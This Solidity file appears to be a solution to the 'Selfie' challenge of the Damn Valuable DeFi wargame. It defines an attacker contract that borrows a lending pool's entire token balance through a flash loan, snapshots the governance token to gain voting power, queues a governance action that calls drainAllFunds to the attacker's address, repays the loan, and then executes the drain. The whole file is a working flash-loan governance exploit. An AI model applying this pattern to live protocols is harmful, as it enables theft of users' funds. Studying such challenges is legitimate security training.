// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
//import "@openzeppelin/contracts/utils/Address.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";


contract SelfieAttacker {

    address public owner;
    uint public id;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;


    constructor(address _poolAddress, address _governanceAddress, address _tokenAddress) {
        owner = msg.sender;
        pool = SelfiePool(_poolAddress);
        governance = SimpleGovernance(_governanceAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress);
    }

    function execute1() public {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address _token, uint _amount) external {
        token.snapshot();
        id = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), token.balanceOf(address(pool)));
        token.transfer(address(pool), _amount);
    }

    function execute2() public {
        governance.executeAction(id);
    }
}